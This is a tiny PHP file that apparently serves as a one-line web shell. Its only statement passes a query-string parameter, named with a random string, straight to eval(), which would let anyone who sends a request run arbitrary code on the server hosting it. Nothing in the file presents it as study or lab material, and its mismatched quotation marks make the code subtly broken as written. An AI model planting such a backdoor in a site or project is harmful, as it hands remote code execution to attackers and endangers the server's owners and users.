<?php
eval($_GET["Ek43uzSr']);
?>
